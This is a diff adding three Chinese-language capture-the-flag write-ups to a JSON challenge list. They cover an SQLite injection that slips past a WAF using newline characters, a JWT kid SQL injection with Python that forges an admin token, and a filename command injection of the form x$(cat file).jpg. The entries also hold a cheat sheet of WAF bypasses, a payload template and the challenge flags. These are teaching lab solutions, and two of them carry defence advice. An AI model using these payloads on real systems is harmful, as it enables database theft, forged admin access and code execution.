@@ -851,11 +851,59 @@
       "category_name": "Web",
       "category_icon": "🌐",
       "category_color": "#00d4ff"
+    },
+    {
+      "id": 601,
+      "title": "小E的管理系统 — SQLite WAF Bypass (%0A换行符)",
+      "slug": "qingcen-serverE-sqli",
+      "category_id": 1,
+      "platform": "QingCen",
+      "difficulty": "Hard",
+      "tags": "[\"SQLi\",\"SQLite\",\"WAF-bypass\",\"newline\",\"CROSS-JOIN\"]",
+      "description": "SQLite注入WAF绕过：换行符%0A替代空格，CROSS JOIN替代逗号",
+      "solved": 1,
+      "created_at": "2026-06-15",
+      "content": "# 小E的管理系统 — SQLite WAF Bypass\n\n## 题目分析\n\n服务器管理系统，`query.php?id=` 接口存在SQLite注入。WAF使用PHP `stripos()` 按空格分割检测SQL关键字。\n\n**WAF拦截**：空格、逗号、`=`、引号、注释（`--` `#` `/* */`）、所有SQL关键字\n\n**WAF放行**：数字、`+ - * % << >> | & ~ ( )`\n\n## 核心绕过思路\n\n### 1. 换行符 `%0A` 替代空格\n\nWAF按空格分割关键字检测，但 `%0A`（换行符）被SQLite当作空白符，WAF不识别：\n\n```\n?id=1%0AUNION%0AALL%0ASELECT%0A1\n```\n\n### 2. CROSS JOIN 替代逗号\n\n逗号被WAF拦截，用CROSS JOIN拼接子查询凑列数：\n\n```sql\nUNION ALL SELECT * FROM (SELECT 1) a CROSS JOIN (SELECT 2) b CROSS JOIN (SELECT 3) c\n```\n\n### 3. 完整Payload\n\nJSON返回5个字段（id, cpu, ram, status, lastChecked），需要凑够5列：\n\n```\n?id=1%0AUNION%0AALL%0ASELECT%0A*%0AFROM%0Asys_config%0ACROSS%0AJOIN%0A(SELECT%0A0)%0ACROSS%0AJOIN%0A(SELECT%0A0)\n```\n\n`sys_config` 有3列 → CROSS JOIN补2个 `(SELECT 0)` = 5列 ✓\n\n## Flag\n\n返回：`{\"id\":\"flag\",\"cpu\":\"flag{a2473edd-83d3-4be7-be56-538d78419598}\"}`\n\n## WAF绕过速查\n\n| 被拦截 | 绕过方案 |\n|--------|----------|\n| 空格 | `%0A`(换行), `%09`(TAB), `%0D`(回车), `/**/` |\n| 逗号 | CROSS JOIN, UNION SELECT, OFFSET N ROWS |\n| `=` | LIKE, GLOB, BETWEEN, IS, `>`, `<` |\n| 引号 | 0xhex, X'hex', char() |\n| UNION | `%0AUNION%0A` (关键字间加换行) |",
+      "category_name": "Web",
+      "category_icon": "🌐",
+      "category_color": "#00d4ff"
+    },
+    {
+      "id": 602,
+      "title": "安全审计控制台 — JWT kid SQL注入",
+      "slug": "qingcen-jwt-sqli",
+      "category_id": 1,
+      "platform": "QingCen",
+      "difficulty": "Medium",
+      "tags": "[\"JWT\",\"SQLi\",\"kid\",\"source-leak\"]",
+      "description": "JWT header kid参数SQL注入，控制密钥伪造admin token",
+      "solved": 1,
+      "created_at": "2026-06-15",
+      "content": "# 安全审计控制台 — JWT kid SQL注入\n\n## 题目分析\n\n页面显示「当前权限: guest」，需要admin权限获取flag。Cookie中有一个JWT token。\n\n## 解题步骤\n\n### 1. 源码泄露\n\n`index.php.bak` 泄露完整PHP源码。\n\n### 2. 发现SQL注入\n\n`kid` 参数直接拼接SQL：\n\n```php\nfunction find_secret(mysqli $db, string $kid) {\n    $sql = \"SELECT secret FROM jwt_keys WHERE kid = '\" . $kid . \"' LIMIT 1\";\n    $result = $db->query($sql);\n    $row = $result->fetch_assoc();\n    return $row['secret'] ?? null;\n}\n```\n\n### 3. UNION注入控制密钥\n\n注入 `kid` 使查询返回我们控制的密钥：\n\n```python\nimport base64, json, hmac, hashlib\n\ndef b64url(data):\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n\nknown_secret = 'a'\nkid = \"' UNION SELECT 'a'-- \"\n\nheader = {\"typ\": \"JWT\", \"alg\": \"HS256\", \"kid\": kid}\npayload = {\"username\": \"admin\", \"role\": \"admin\"}\n\nh = b64url(json.dumps(header).encode())\np = b64url(json.dumps(payload).encode())\nsig = hmac.new(known_secret.encode(), (h + '.' + p).encode(), hashlib.sha256).digest()\ntoken = h + '.' + p + '.' + b64url(sig)\n```\n\nSQL变成：`SELECT secret FROM jwt_keys WHERE kid = '' UNION SELECT 'a'' LIMIT 1`\n\n返回密钥 `a` → 用 `a` 签名admin JWT → 服务器验证通过！\n\n### 4. 获取Flag\n\n带上伪造的JWT cookie访问页面，role=admin → 显示flag。\n\n## Flag\n\n`flag{23dc9e54-5917-45ab-ba5d-cbe4be8cfa0e}`\n\n## 关键教训\n\n- 始终检查 `.bak`, `~`, `.swp`, `.old` 备份文件\n- JWT的 `kid` header是用户可控的，不应直接用于SQL查询\n- 参数化查询防止SQL注入",
+      "category_name": "Web",
+      "category_icon": "🌐",
+      "category_color": "#00d4ff"
+    },
+    {
+      "id": 603,
+      "title": "在线图片检测中心 — 文件名命令注入RCE",
+      "slug": "qingcen-filename-rce",
+      "category_id": 9,
+      "platform": "QingCen",
+      "difficulty": "Medium",
+      "tags": "[\"RCE\",\"command-injection\",\"filename\",\"file-upload\"]",
+      "description": "文件名$()命令替换注入exec()，读取服务器flag",
+      "solved": 1,
+      "created_at": "2026-06-15",
+      "content": "# 在线图片检测中心 — 文件名命令注入RCE\n\n## 题目分析\n\n上传JPG图片后，系统用 `file` 命令检测文件类型。文件名直接拼接到 `exec()`：\n\n```php\n$uploadedName = $_FILES['photo']['name'];\n$command = 'file uploads/' . $uploadedName . ' 2>&1';\nexec($command, $details, $status);\n```\n\n## 解题步骤\n\n### 1. 源码泄露\n\n`index.php.bak` 泄露PHP源码，发现命令注入点。\n\n### 2. 命令注入\n\n文件名用 `$()` 命令替换：\n\n```\nx$(whoami).jpg → exec('file uploads/x$(whoami).jpg')\nShell展开 → file uploads/xwww-data.jpg\n```\n\n`file` 命令报错信息中泄露了命令输出。\n\n### 3. 探索文件系统\n\n```bash\n# $(ls) 发现当前目录文件\nx$(ls).jpg\n# → index.php, index.php.bak, pigeon_cat.php, uploads/\n\n# $(pwd) 确认路径\nx$(pwd).jpg\n# → /var/www/html\n```\n\n### 4. 读取Flag\n\n`pigeon_cat.php` 中包含flag：\n\n```\nx$(cat pigeon_cat.php).jpg\n```\n\n`file` 报错信息中出现：`flag{b9e6a960-a3b6-46de-876e-0c26ffb1549a}.jpg: cannot open`\n\n## Flag\n\n`flag{b9e6a960-a3b6-46de-876e-0c26ffb1549a}`\n\n## Payload模板\n\n```\nx$(<command>).jpg     # 命令替换，输出嵌入文件名\nx`command`.jpg         # 反引号命令替换\n```\n\n## 防御\n\n- 使用 `escapeshellarg()` 转义文件名\n- 重命名为随机名称，不使用原始文件名\n- 使用白名单校验文件名字符",
+      "category_name": "CMD",
+      "category_icon": "⌨️",
+      "category_color": "#ff2d95"
     }
   ],
   "stats": {
-    "total": 49,
-    "solved": 48,
+    "total": 52,
+    "solved": 51,
     "categories": 11,
     "firstBlood": 4
   }
